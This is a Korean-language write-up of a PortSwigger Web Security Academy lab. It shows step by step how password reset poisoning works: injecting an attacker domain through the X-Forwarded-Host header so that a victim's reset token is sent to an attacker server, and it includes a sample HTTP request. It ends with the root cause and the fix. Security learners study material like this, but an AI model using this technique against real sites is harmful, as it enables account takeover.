# 🚩Lab: Password reset poisoning via middleware

```text
This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives.
To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter.
Any emails sent to this account can be read via the email client on the exploit server.
```

### 🔍 분석 및 공격 과정
1. 비밀번호 변경을 해보자. wiener의 비밀번호 변경 요청시 이메일로 동적 토큰이 포함된 링크를 전송해줌.
  ```http
POST /forgot-password HTTP/2
Host: 0a7100100448d03b8078216700370077.web-security-academy.net
Cookie: session=nxiitZ2zzqcWN6nHx8ThFcXYHhPKHxWU
X-Forwarded-Host: exploit-0a4300710498d05d8051202b01d9001e.exploit-server.net
Content-Length: 15
Cache-Control: max-age=0
...

username=wiener
```
2. 랩의 제목에서 힌트를 얻어보자. middleware란 말 그대로 클라이언트와 백엔드 서버 사이에 위치한 Nginx, Apache 같은 것임.
3. 미들웨어 헤더가 사용 가능한지 체크해보자.`password reset poisoning`에 사용되는 대표적인 미들웨어 헤더로 `X-Forwarded-Host`, `X-Forwared-For`, `X-Forwarded-Proto`, `X-Host`등이 존재.
4. 이때 시도 해볼만한 헤더는 클라이언트의 원래 요청한 `Host` 헤더 정보를 백엔드에 전달하는 `X-Forwarded-Host`헤더이다.
5. 비밀번호 변경을 POST하는 패킷을 리피터로 보내 헤더필드에 `X-Forwarded-Host: aaa.com`을 추가한다.
6. 이메일 함으로 이동해 확인해보면 비밀번호 변경 페이지가 `https://aaa.com/?token=~~~`로 변경되어있다.
7. 즉, 백엔드에서 미들웨어 헤더인 `X-Forwarded-Host`를 신뢰하며 해당값을 바탕으로 동적인 비밀번호 변경페이지를 생성해서 `username=wiener`의 이메일로 전송하고 있는 것으로 보인다.
8. 그렇다면 `XFH`헤더의 값을 공격자도메인으로 주면 링크는 `https://공격자도메인/?token=~~~~` 로 생성되고, `username=carlos`로 변경하면 carlos의 이메일로 전송될 것이다.
9. carlos가 그 링크를 누르면 공격자서버에 log에 찍히게 되고 거기에 찍힌 token값을 이용해 carlos의 비밀번호를 변경하면 된다. solve
                        
### 💡 취약점 원리
  백엔드에서 미들웨어 헤더를 전적으로 신뢰하며 동적으로 비밀번호 변경 링크를 만들어 내는 것이 문제였음. 링크 생성시 조작 가능한 클라이언트 헤더를 신뢰해선 안되며 반드시 절대도메인을 고정하여
 사용해야한다.
